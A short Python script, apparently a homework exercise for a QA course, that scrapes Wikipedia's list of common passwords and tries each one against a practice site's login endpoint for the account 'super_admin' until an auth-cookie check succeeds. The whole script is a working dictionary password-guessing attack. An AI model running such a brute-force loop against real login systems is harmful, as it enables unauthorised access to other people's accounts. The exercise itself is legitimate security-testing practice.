import requests
from lxml import html


response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")

tree = html.fromstring(response.text)

locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = list(set(tree.xpath(locator)))


for password in passwords:
    password = str(password).strip()
    loginResponse = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                          data={"login": "super_admin", "password": password})
    authCookie = loginResponse.cookies.get("auth_cookie")

    checkLogin = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie":authCookie})
    checkLoginMsg = checkLogin.text
    print("check pass " + password + " message is " + checkLoginMsg)

    if checkLoginMsg == "You are authorized":
        print("correct password is " + password)
        break





